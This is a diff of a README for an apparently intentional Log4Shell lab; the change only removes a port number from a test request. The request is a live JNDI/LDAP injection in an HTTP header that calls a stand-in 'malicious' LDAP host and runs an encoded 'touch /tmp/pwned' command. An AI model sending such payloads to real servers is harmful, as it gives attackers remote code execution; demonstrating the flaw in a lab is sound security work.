@@ -13,7 +13,7 @@ You will reach all the Vulnerable application with the exposed 80 port from the 
 `  export TOKEN=<your agent token>`  
 `  docker-compose up `  
 `  from another machine run "curl "http://docker host ip address"" and if you recieve "status":400,"error":"Bad Request","path":"/" as response, the server is properly listening`
-`  from the same machine now run "curl "http://docker host ip address":8080 -H 'X-Api-Version: ${jndi:ldap://malicious:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'" this last request inject the LDAP call in the log and the Log4J vulnerable dependency try to execute it, connecting to the malicious server and executing a "touch /tmp/pwned" command`
+`  from the same machine now run "curl "http://docker host ip address" -H 'X-Api-Version: ${jndi:ldap://malicious:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'" this last request inject the LDAP call in the log and the Log4J vulnerable dependency try to execute it, connecting to the malicious server and executing a "touch /tmp/pwned" command`
 `  in the docker host we can run "docker ps" and look for a container with the name log4shell-log4shell grab the ID and run "docker logs -f "ID of container"" you will see the logs of the server when executes the command`
 `  in the docker host again we can run with the same container ID 'docker exec "ID of container" ls /tmp/' and you will see the file created by the attack`
 `  docker-compose down `  
